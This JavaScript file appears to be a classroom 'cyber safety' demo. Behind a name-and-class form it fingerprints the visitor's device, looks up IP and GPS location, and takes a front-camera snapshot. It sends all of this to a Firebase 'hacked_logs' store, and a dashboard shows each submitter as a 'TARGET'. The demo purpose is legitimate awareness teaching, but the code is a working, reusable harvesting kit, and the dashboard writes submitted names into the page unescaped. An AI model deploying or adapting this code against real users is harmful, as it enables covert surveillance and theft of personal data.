// ==========================================
// 1. FIREBASE INITIALIZATION
// ==========================================
const firebaseConfig = {
    databaseURL: "https://cybersafetydemo-default-rtdb.firebaseio.com"
};

if (typeof firebase !== 'undefined') {
    firebase.initializeApp(firebaseConfig);
}

const database = typeof firebase !== 'undefined' ? firebase.database() : null;

// ==========================================
// 2. ADVANCED DEVICE BRAND DETECTOR
// ==========================================
function getDeviceBrand() {
    const ua = navigator.userAgent;

    if (/iPhone/i.test(ua)) return "Apple iPhone";
    if (/iPad/i.test(ua)) return "Apple iPad";
    if (/Samsung|SM-|GT-/i.test(ua)) return "Samsung Galaxy";
    if (/OnePlus|ONEPLUS/i.test(ua)) return "OnePlus";
    if (/IQOO|iQOO/i.test(ua)) return "iQOO";
    if (/POCO/i.test(ua)) return "POCO";
    if (/Redmi|Mi |Xiaomi/i.test(ua)) return "Xiaomi / Redmi";
    if (/Realme|RMX/i.test(ua)) return "Realme";
    if (/Vivo|vivo/i.test(ua)) return "Vivo";
    if (/OPPO|Oppo|CPH/i.test(ua)) return "OPPO";
    if (/Infinix/i.test(ua)) return "Infinix";
    if (/Tecno/i.test(ua)) return "Tecno";
    if (/Pixel/i.test(ua)) return "Google Pixel";
    if (/Motorola|Moto/i.test(ua)) return "Motorola";
    if (/Nothing/i.test(ua)) return "Nothing Phone";
    if (/Android/i.test(ua)) return "Android Smartphone";
    if (/Windows/i.test(ua)) return "Windows PC/Laptop";
    if (/Macintosh/i.test(ua)) return "MacBook / Mac";

    return "Smart Mobile Device";
}

// ==========================================
// 3. INCOGNITO MODE & STORAGE DETECTION
// ==========================================
async function detectIncognitoAndStorage() {
    let isIncognito = false;
    let storageEstimate = "Unknown";

    try {
        if (navigator.storage && navigator.storage.estimate) {
            const { quota } = await navigator.storage.estimate();
            const quotaInGB = Math.round(quota / (1024 * 1024 * 1024));
            storageEstimate = `~${quotaInGB} GB Allocated`;

            if (quota < 1200000000) { 
                isIncognito = true;
            }
        }
    } catch (e) {}

    if (!isIncognito && window.webkitRequestFileSystem) {
        window.webkitRequestFileSystem(
            window.TEMPORARY, 100,
            () => { isIncognito = false; },
            () => { isIncognito = true; }
        );
    }

    return {
        mode: isIncognito ? "⚠️ INCOGNITO / PRIVATE WINDOW" : "Standard Browser",
        storage: storageEstimate
    };
}

// ==========================================
// 4. LIVE NETWORK SPEED & PING METRICS
// ==========================================
function getNetworkMetrics() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        const type = conn.effectiveType ? conn.effectiveType.toUpperCase() : "4G/WiFi";
        const downlink = conn.downlink ? `${conn.downlink} Mbps` : "High Speed";
        const rtt = conn.rtt ? `${conn.rtt} ms` : "30 ms";
        return {
            speed: `${type} (${downlink})`,
            ping: rtt
        };
    }
    return {
        speed: "Cellular / Broadband",
        ping: "~40 ms"
    };
}

// ==========================================
// 5. AUDIO HARDWARE FINGERPRINTING
// ==========================================
function getAudioFingerprint() {
    try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        if (!AudioCtx) return "Audio API Blocked";
        const ctx = new AudioCtx();
        const sampleRate = ctx.sampleRate ? `${ctx.sampleRate} Hz` : "48000 Hz";
        const state = ctx.state || "active";
        ctx.close();
        return `DSP Engine (${sampleRate}, ${state})`;
    } catch (e) {
        return "Generic Audio Engine";
    }
}

// ==========================================
// 6. DEEP HARDWARE & SYSTEM FINGERPRINTING
// ==========================================
function getDeepHardwareSpecs() {
    const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
    const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unknown";
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Touch Points` : "No Touch";

    let gpu = "Generic GPU";
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch (e) {}

    const language = navigator.language || "en-US";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Kolkata";

    return {
        cpuCores: cpuCores,
        ram: ram,
        gpu: gpu,
        screenRes: screenRes,
        touchPoints: touchPoints,
        language: language,
        timezone: timezone
    };
}

// ==========================================
// 7. BATTERY STATUS TRACKER
// ==========================================
async function getBatteryStatus() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? "⚡ Charging" : "🔋 Discharging";
            return `${level}% (${charging})`;
        } else {
            return "N/A";
        }
    } catch (e) {
        return "N/A";
    }
}

// ==========================================
// 8. REAL IP & LOCATION DETAILS
// ==========================================
async function getIPAndNetworkDetails() {
    try {
        let response = await fetch('https://ipapi.co/json/');
        let data = await response.json();
        return {
            ip: data.ip || "127.0.0.1",
            network: data.org || "Cellular Network",
            location: `${data.city}, ${data.region_code}`
        };
    } catch (error) {
        return {
            ip: "Local IP",
            network: "Network Unknown",
            location: "Location Unavailable"
        };
    }
}

// ==========================================
// 9. FRONT CAMERA SNAPSHOT CAPTURE FUNCTION
// ==========================================
async function captureFrontCameraPhoto() {
    return new Promise((resolve) => {
        const video = document.getElementById('webcamVideo');
        const canvas = document.getElementById('photoCanvas');

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            resolve(null);
            return;
        }

        navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        })
        .then((stream) => {
            if (video) {
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    if (canvas) {
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.6);
                        stream.getTracks().forEach(track => track.stop());
                        resolve(imageData);
                    } else {
                        stream.getTracks().forEach(track => track.stop());
                        resolve(null);
                    }
                }, 1200);
            } else {
                stream.getTracks().forEach(track => track.stop());
                resolve(null);
            }
        })
        .catch(() => {
            resolve(null);
        });
    });
}

// ==========================================
// 10. DYNAMIC RISK SCORE CALCULATOR
// ==========================================
function calculateRiskScore(hasLocation, hasPhoto) {
    let score = 40; // Base risk score for automated hardware fingerprinting
    if (hasLocation) score += 25;
    if (hasPhoto) score += 30;
    
    let level = "MEDIUM RISK";
    let color = "#ffcc00";

    if (score >= 80) {
        level = "CRITICAL EXPOSURE";
        color = "#ff003c";
    } else if (score >= 60) {
        level = "HIGH EXPOSURE";
        color = "#ff6600";
    }

    return { score, level, color };
}

// ==========================================
// 11. FORM SUBMIT FUNCTION (index.html)
// ==========================================
async function submitData(e) {
    if (e) e.preventDefault();

    const nameInput = document.getElementById('username') || document.getElementById('studentName');
    const classInput = document.getElementById('classSelect') || document.getElementById('studentClass');

    const name = nameInput ? nameInput.value.trim() : "";
    const studentClass = classInput ? classInput.value.trim() : "";

    if (name === "" || studentClass === "") {
        alert("⚠️ ACCESS DENIED: Please enter Name and Class!");
        return;
    }

    const device = getDeviceBrand();
    const deepSpecs = getDeepHardwareSpecs();
    const batteryStatus = await getBatteryStatus();
    const incognitoData = await detectIncognitoAndStorage();
    const netMetrics = getNetworkMetrics();
    const audioFP = getAudioFingerprint();

    const netDetails = await getIPAndNetworkDetails();
    const realIP = netDetails.ip;
    const realNetwork = netDetails.network;
    let userLocation = netDetails.location;

    const capturedPhoto = await captureFrontCameraPhoto();

    const pushData = (locationStr, isGps) => {
        const risk = calculateRiskScore(isGps, !!capturedPhoto);
        pushToFirebase({
            name: name,
            class: studentClass,
            device: device,
            location: locationStr,
            network: realNetwork,
            ip: realIP,
            battery: batteryStatus,
            deepSpecs: deepSpecs,
            incognito: incognitoData,
            netMetrics: netMetrics,
            audioFP: audioFP,
            photo: capturedPhoto,
            risk: risk
        });
    };

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                let lat = position.coords.latitude.toFixed(4);
                let lon = position.coords.longitude.toFixed(4);
                pushData(`GPS: ${lat}, ${lon} | ${userLocation}`, true);
            },
            () => {
                pushData(userLocation, false);
            },
            { timeout: 5000 }
        );
    } else {
        pushData(userLocation, false);
    }
}

function pushToFirebase(payload) {
    if (database) {
        database.ref('hacked_logs').push({
            name: payload.name,
            class: payload.class,
            device: payload.device,
            location: payload.location,
            network: payload.network,
            ip: payload.ip,
            battery: payload.battery,
            cpu: payload.deepSpecs.cpuCores,
            ram: payload.deepSpecs.ram,
            gpu: payload.deepSpecs.gpu,
            screen: payload.deepSpecs.screenRes,
            touch: payload.deepSpecs.touchPoints,
            lang: payload.deepSpecs.language,
            timezone: payload.deepSpecs.timezone,
            browserMode: payload.incognito.mode,
            storage: payload.incognito.storage,
            netSpeed: payload.netMetrics.speed,
            ping: payload.netMetrics.ping,
            audioHardware: payload.audioFP,
            photo: payload.photo || null,
            riskScore: payload.risk.score,
            riskLevel: payload.risk.level,
            riskColor: payload.risk.color,
            time: new Date().toLocaleTimeString()
        }).then(() => {
            showWarningScreen();
        });
    } else {
        showWarningScreen();
    }
}

function showWarningScreen() {
    if (document.getElementById('auditForm')) document.getElementById('auditForm').style.display = 'none';
    if (document.getElementById('formSection')) document.getElementById('formSection').style.display = 'none';
    if (document.getElementById('warning')) document.getElementById('warning').style.display = 'block';
}

// Event Listener
document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById('auditForm');
    if (form) {
        form.addEventListener('submit', submitData);
    }
});

// ==========================================
// 12. EXPLAINER MODAL FUNCTION
// ==========================================
function openExplainerModal(name, device, cpu, gpu, photoPresent, score) {
    let existingModal = document.getElementById('explainerModal');
    if (existingModal) existingModal.remove();

    const modal = document.createElement('div');
    modal.id = 'explainerModal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100vw';
    modal.style.height = '100vh';
    modal.style.background = 'rgba(0, 0, 0, 0.85)';
    modal.style.display = 'flex';
    modal.style.justifyContent = 'center';
    modal.style.alignItems = 'center';
    modal.style.zIndex = '99999';
    modal.style.padding = '20px';

    modal.innerHTML = `
        <div style="background: #0d0d0d; border: 2px solid #ff003c; border-radius: 8px; max-width: 500px; width: 100%; padding: 20px; color: #fff; box-shadow: 0 0 25px rgba(255,0,60,0.5); font-family: monospace;">
            <h3 style="color: #ff003c; margin-top: 0; text-transform: uppercase;">❓ EXPLAINING TELEMETRY FOR ${name}</h3>
            
            <p style="font-size: 13px; line-height: 1.5; color: #ccc;">
                <b>1. How was Hardware (CPU/GPU) read?</b><br>
                Browsers automatically expose hardware details like <span style="color:#00e5ff;">${cpu}</span> and GPU (<span style="color:#ffcc00;">${gpu}</span>) via WebGL so websites can render graphics smoothly.
            </p>

            <p style="font-size: 13px; line-height: 1.5; color: #ccc;">
                <b>2. How was Camera Snapshot taken?</b><br>
                ${photoPresent ? "The target granted permission on the interactive prompt. HTML5 MediaDevices API captured the frame." : "No camera permission granted. Only hardware fingerprint was extracted."}
            </p>

            <p style="font-size: 13px; line-height: 1.5; color: #ccc;">
                <b>3. Why is Risk Score at ${score}%?</b><br>
                Combining IP routing, hardware canvas fingerprinting, and device telemetry creates a unique mathematical signature for tracking.
            </p>

            <button onclick="document.getElementById('explainerModal').remove()" style="background: #ff003c; border: none; color: white; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; border-radius: 4px;">CLOSE EXPLAINER</button>
        </div>
    `;

    document.body.appendChild(modal);
}

// ==========================================
// 13. REALTIME DASHBOARD LISTENER (dashboard.html)
// ==========================================
if (document.getElementById('logsContainer')) {
    const logsContainer = document.getElementById('logsContainer');
    const alertSound = document.getElementById('alertSound');
    const counterElement = document.getElementById('targetCounter');

    if (database) {
        database.ref('hacked_logs').on('child_added', (snapshot) => {
            const data = snapshot.val();
            const key = snapshot.key;

            if (document.getElementById(`log-${key}`)) return;

            if (alertSound) {
                alertSound.play().catch(() => {});
            }

            const card = document.createElement('div');
            card.id = `log-${key}`;
            card.style.background = "#090000";
            card.style.borderLeft = `5px solid ${data.riskColor || '#ff003c'}`;
            card.style.borderRight = "1px solid #330000";
            card.style.borderTop = "1px solid #330000";
            card.style.borderBottom = "1px solid #330000";
            card.style.padding = "15px 20px";
            card.style.margin = "10px 0";
            card.style.borderRadius = "4px";
            card.style.boxShadow = "0 0 15px rgba(255, 0, 60, 0.4)";

            const photoHtml = data.photo ? `
                <div style="margin-top: 10px; margin-bottom: 8px;">
                    <span style="color: #00ff66; font-size: 11px; font-weight: bold; display: block; margin-bottom: 4px;">📷 SURVEILLANCE SNAPSHOT:</span>
                    <img src="${data.photo}" style="width: 140px; height: 105px; object-fit: cover; border: 2px solid #ff003c; border-radius: 4px; box-shadow: 0 0 10px rgba(255, 0, 60, 0.6);" />
                </div>
            ` : '';

            const riskScore = data.riskScore || 50;
            const riskLevel = data.riskLevel || 'MEDIUM EXPOSURE';
            const riskColor = data.riskColor || '#ffcc00';

            card.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                    <div style="font-size: 18px; color: #ffffff; font-weight: bold;">
                        🚨 TARGET: <span style="color: #ff003c;">${data.name.toUpperCase()}</span>
                    </div>
                    <!-- DYNAMIC RISK METER -->
                    <div style="background: rgba(0,0,0,0.6); border: 1px solid ${riskColor}; padding: 4px 8px; border-radius: 4px; font-size: 11px; color: ${riskColor}; font-weight: bold;">
                        RISK SCORE: ${riskScore}% [${riskLevel}]
                    </div>
                </div>

                <div style="font-size: 13px; color: #ff8888; line-height: 1.6;">
                    Class: <span style="color: #00ff66;">${data.class}</span> | 
                    Device: <span style="color: #00ff66;">${data.device}</span> | 
                    Battery: <span style="color: #00e5ff; font-weight: bold;">${data.battery || 'N/A'}</span> <br>
                    Network Provider: <span style="color: #00ff66; font-weight: bold;">${data.network || 'Live Carrier'}</span> | 
                    IP: <span style="color: #00ff66;">${data.ip || 'Captured'}</span> <br>
                    Location: <span style="color: #ffcc00;">${data.location || 'Active'}</span>
                </div>

                <!-- INCOGNITO & NETWORK TELEMETRY -->
                <div style="margin-top: 8px; padding: 6px 10px; background: rgba(255, 204, 0, 0.1); border-left: 3px solid #ffcc00; font-size: 11px; color: #ffcc00;">
                    <b>🔍 PRIVACY & BANDWIDTH:</b> ${data.browserMode || 'Standard'} | Speed: <span style="color:#fff;">${data.netSpeed || '4G'}</span> (Ping: ${data.ping || '30ms'})
                </div>

                <!-- DEEP HARDWARE BREAKDOWN -->
                <div style="margin-top: 6px; padding: 8px; background: rgba(255, 0, 60, 0.1); border: 1px dashed #ff003c; border-radius: 4px; font-size: 11px; color: #00e5ff;">
                    <b>⚙️ DEEP HARDWARE PROFILE:</b><br>
                    CPU: <span style="color: #fff;">${data.cpu || 'N/A'}</span> | RAM: <span style="color: #fff;">${data.ram || 'N/A'}</span> | Display: <span style="color: #fff;">${data.screen || 'N/A'} (${data.touch || 'Touch'})</span><br>
                    GPU: <span style="color: #ffcc00;">${data.gpu || 'Mobile Graphics'}</span><br>
                    Audio Hardware: <span style="color: #00ff66;">${data.audioHardware || 'DSP Active'}</span> | Locale: <span style="color: #fff;">${data.lang || 'en'}</span>
                </div>

                ${photoHtml}

                <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px;">
                    <div style="font-size: 11px; color: #ff003c; font-weight: bold;">
                        ❌ DATA STATUS: LEAKED <span style="color: #e6e6e6; font-weight: normal;">(${data.time || 'Live'})</span>
                    </div>
                    <!-- EXPLAINER POPUP BUTTON -->
                    <button onclick="openExplainerModal('${data.name}', '${data.device}', '${data.cpu}', '${data.gpu}', ${!!data.photo}, ${riskScore})" style="background: rgba(0, 229, 255, 0.2); border: 1px solid #00e5ff; color: #00e5ff; font-size: 10px; padding: 4px 8px; cursor: pointer; border-radius: 3px; font-weight: bold;">
                        ❓ EXPLAIN TO STUDENTS
                    </button>
                </div>
            `;

            logsContainer.prepend(card);

            if (counterElement) {
                counterElement.innerText = logsContainer.children.length;
            }
        });

        database.ref('hacked_logs').on('child_removed', (snapshot) => {
            const key = snapshot.key;
            const cardToRemove = document.getElementById(`log-${key}`);
            if (cardToRemove) cardToRemove.remove();
        });
    }
}

// ==========================================
// 14. RESET ALL DATA FUNCTION
// ==========================================
function resetAllData() {
    if (confirm("⚠️ Clear all student records for the new demo?")) {
        if (database) {
            database.ref('hacked_logs').remove().then(() => {
                alert("✅ All demo data cleared!");
                location.reload();
            });
        }
    }
}